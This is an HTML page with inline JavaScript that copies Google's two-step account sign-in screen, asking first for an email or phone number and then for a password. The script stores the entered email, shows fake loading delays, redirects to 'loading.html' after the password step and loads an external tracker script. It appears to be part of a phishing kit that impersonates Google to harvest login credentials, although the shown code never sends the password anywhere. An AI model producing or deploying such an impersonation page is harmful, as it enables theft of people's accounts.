<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Account</title>
    <link rel="icon" type="image/png" href="assets/images/favicon.png">
    <link rel="stylesheet" href="styles.css">

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <div class="wrapper">
        <div class="signin-box">
            <!-- Loading bar -->
            <div class="loading-bar"></div>
            
            <div class="logo-container">
                <img src="assets/images/favicon.png" alt="Google" width="48" height="48">
            </div>

            <!-- Email Login Content -->
            <div id="emailContent" class="main-content">
                <div class="left-side">
                    <h1 class="heading">Sign in</h1>
                    <p class="subheading">with your Google Account. This account will be available to other Google apps in the browser.</p>
                </div>

                <div class="right-side">
                    <form id="signInForm">
                        <div class="input-wrapper">
                            <label for="email" class="input-label">Email or phone</label>
                            <input 
                                type="text" 
                                id="email" 
                                name="email" 
                                autocomplete="email"
                            >
                        </div>

                        <a href="#" class="forgot-email">Forgot email?</a>

                        <p class="guest-mode-text">Not your computer? Use Guest mode to sign in privately. <a href="#" class="learn-more">Learn more about using Guest mode</a></p>

                        <div class="button-row">
                            <button type="button" class="btn-create-account">Create account</button>
                            <button type="submit" class="btn-next">Next</button>
                        </div>
                    </form>
                </div>
            </div>

            <!-- Password Content (Hidden Initially) -->
            <div id="passwordContent" class="main-content" style="display: none;">
                <div class="left-side">
                    <h1 class="heading">Welcome</h1>
                    <div class="user-selector-welcome">
                        <div class="user-avatar-small">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                                <circle cx="12" cy="12" r="12" fill="#5f6368"/>
                                <path d="M12 12c1.65 0 3-1.35 3-3s-1.35-3-3-3-3 1.35-3 3 1.35 3 3 3zm0 1.5c-2 0-6 1-6 3V18h12v-1.5c0-2-4-3-6-3z" fill="#fff"/>
                            </svg>
                        </div>
                        <span id="userEmailDisplay" class="user-email-text"></span>
                        <svg width="20" height="20" viewBox="0 0 20 20" fill="#9aa0a6">
                            <path d="M7 10l5 5 5-5z"/>
                        </svg>
                    </div>
                </div>

                <div class="right-side">
                    <form id="passwordForm">
                        <div class="input-wrapper">
                            <label for="password" class="input-label">Enter your password</label>
                            <input 
                                type="password" 
                                id="password" 
                                name="password" 
                                autocomplete="current-password"
                            >
                        </div>

                        <div class="checkbox-wrapper">
                            <input type="checkbox" id="showPassword" name="showPassword">
                            <label for="showPassword" class="checkbox-label">Show password</label>
                        </div>

                        <div class="button-row">
                            <a href="#" class="forgot-password">Forgot password?</a>
                            <button type="submit" class="btn-next">Next</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <footer class="page-footer">
            <div class="footer-left">
                <select id="language" name="language" class="language-select">
                    <option value="en">English (United States)</option>
                </select>
            </div>
            <div class="footer-right">
                <a href="#" class="footer-link">Help</a>
                <a href="#" class="footer-link">Privacy</a>
                <a href="#" class="footer-link">Terms</a>
            </div>
        </footer>
    </div>

    <script src="script.js"></script>
    <script>
        // Email input floating label functionality
        const emailInputWrapper = document.querySelector('#emailContent .input-wrapper');
        const emailInput = document.getElementById('email');

        emailInput.addEventListener('focus', function() {
            emailInputWrapper.classList.add('focused');
        });

        emailInput.addEventListener('blur', function() {
            emailInputWrapper.classList.remove('focused');
            if (emailInput.value.trim() !== '') {
                emailInputWrapper.classList.add('filled');
            } else {
                emailInputWrapper.classList.remove('filled');
            }
        });

        if (emailInput.value.trim() !== '') {
            emailInputWrapper.classList.add('filled');
        }

        // Email form submission - show loading and transition to password
        const signInForm = document.getElementById('signInForm');
        const loadingBar = document.querySelector('.loading-bar');
        const emailContent = document.getElementById('emailContent');
        const passwordContent = document.getElementById('passwordContent');
        const userEmailDisplay = document.getElementById('userEmailDisplay');

        signInForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            if (!email) return;

            // Validate email or phone number format
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const phoneRegex = /^[\d\s\-\+\(\)]+$/;
            
            // Check if it's a valid email or phone number
            const isValidEmail = emailRegex.test(email);
            const isValidPhone = phoneRegex.test(email) && email.replace(/\D/g, '').length >= 7;
            
            if (!isValidEmail && !isValidPhone) {
                // Don't proceed if invalid format
                emailInputWrapper.style.borderColor = '#d93025';
                return;
            }
            
            // Reset border color if valid
            emailInputWrapper.style.borderColor = '';

            localStorage.setItem('email', email);

            // Show loading bar
            loadingBar.classList.add('loading');

            // After loading completes (4 seconds)
            setTimeout(function() {
                // Hide loading bar
                loadingBar.classList.remove('loading');
                
                // Update user email display
                userEmailDisplay.textContent = email;
                
                // Switch content
                emailContent.style.display = 'none';
                passwordContent.style.display = 'flex';
                
                // Focus password input after transition
                setTimeout(function() {
                    document.getElementById('password').focus();
                }, 100);
            }, 4000);
        });

        // Password input floating label functionality
        const passwordInputWrapper = document.querySelector('#passwordContent .input-wrapper');
        const passwordInput = document.getElementById('password');
        const showPasswordCheckbox = document.getElementById('showPassword');

        passwordInput.addEventListener('focus', function() {
            passwordInputWrapper.classList.add('focused');
        });

        passwordInput.addEventListener('blur', function() {
            passwordInputWrapper.classList.remove('focused');
            if (passwordInput.value.trim() !== '') {
                passwordInputWrapper.classList.add('filled');
            } else {
                passwordInputWrapper.classList.remove('filled');
            }
        });

        if (passwordInput.value.trim() !== '') {
            passwordInputWrapper.classList.add('filled');
        }

        showPasswordCheckbox.addEventListener('change', function() {
            passwordInput.type = this.checked ? 'text' : 'password';
        });

        // Password form submission
        const passwordForm = document.getElementById('passwordForm');
        passwordForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const password = passwordInput.value.trim();
            if (!password) return;
            
            // Show loading bar with 2 lines animation
            loadingBar.classList.add('loading-two');
            
            // After 2 lines complete (2 seconds), redirect to loading page
            setTimeout(function() {
                window.location.href = 'loading.html';
            }, 2000);
        });
    </script>
</body>
</html>
